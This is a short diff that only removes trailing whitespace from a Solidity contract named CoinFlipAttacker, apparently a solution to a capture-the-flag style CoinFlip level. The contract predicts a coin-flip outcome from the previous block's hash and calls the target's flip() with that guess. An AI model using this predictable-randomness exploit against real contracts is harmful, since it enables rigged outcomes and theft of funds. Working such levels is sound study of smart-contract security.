@@ -7,14 +7,14 @@ interface ICoinFlip {
 
 contract CoinFlipAttacker {
     uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    
+
     uint256 s_lastHash;
     ICoinFlip s_coinFlip;
 
     constructor(address _coinFlip) {
         s_coinFlip = ICoinFlip(_coinFlip);
     }
-    
+
     function attack() external {
         uint256 blockValue = uint256(blockhash(block.number - 1));
 
@@ -23,7 +23,7 @@ contract CoinFlipAttacker {
         }
 
         s_lastHash = blockValue;
-        bool side = _guessSide(blockValue); 
+        bool side = _guessSide(blockValue);
 
         s_coinFlip.flip(side);
     }
